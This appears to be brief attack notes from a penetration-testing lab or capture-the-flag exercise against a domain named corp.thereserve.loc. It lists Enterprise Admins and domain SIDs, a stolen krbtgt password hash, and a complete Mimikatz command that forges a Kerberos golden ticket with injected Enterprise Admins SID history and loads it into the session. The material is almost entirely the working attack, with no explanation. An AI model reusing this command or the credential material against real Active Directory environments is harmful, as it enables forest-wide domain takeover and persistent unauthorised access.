Enterprise Admins:
S-1-5-21-1255581842-1300659601-3764024703-519

CORPDC:
S-1-5-21-170228521-1485475711-3199862024-1009

krbtgt hash:
0c757a3445acb94a654554f3ac529ede

# sid is corpdc, sids is enterprise admins
kerberos::golden /user:krbtgt /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
